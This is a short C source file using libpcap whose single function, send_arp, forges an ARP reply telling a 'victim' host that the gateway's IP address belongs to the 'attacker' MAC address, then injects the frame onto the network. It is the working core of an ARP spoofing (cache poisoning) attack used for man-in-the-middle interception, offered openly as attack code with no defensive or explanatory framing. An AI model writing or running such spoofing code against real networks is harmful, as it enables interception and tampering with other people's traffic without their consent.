#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>

void send_arp(pcap_t *handle, struct ether_addr *victim_mac, struct ether_addr *attacker_mac, struct in_addr *gateway_ip, struct in_addr *victim_ip) {
	struct ether_header ether;
	struct ether_arp arp;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;

	ether.ether_type = htons(ETHERTYPE_ARP); 

	memcpy(ether.ether_dhost, victim_mac, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);

	memcpy(&arp.arp_sha, attacker_mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_spa, gateway_ip, sizeof(struct in_addr));
	memcpy(&arp.arp_tha, victim_mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, victim_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
 
   	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
   		printf("error1\n");
}